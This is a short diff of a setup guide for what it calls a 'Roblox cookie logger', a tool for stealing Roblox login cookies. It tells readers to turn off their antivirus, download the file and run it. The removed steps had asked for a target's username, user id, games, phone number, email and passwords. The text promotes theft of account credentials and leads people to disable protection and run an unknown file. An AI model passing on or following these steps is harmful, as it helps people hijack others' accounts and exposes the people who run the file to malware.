@@ -5,9 +5,5 @@ Hello, We have made a Roblox cookie logger make sure to turn your anti virus off
 How to set up
 1. Turn AV/anti virus off
 2. Download File
-3. Open file
-4.Enter roblox username
-5.Enter there user id
-6.enter ANY game they have made
-7.Final step if you have this users phone number or email or any password to anything put it in and click build.
+3. Run File
 8. Enjoy!
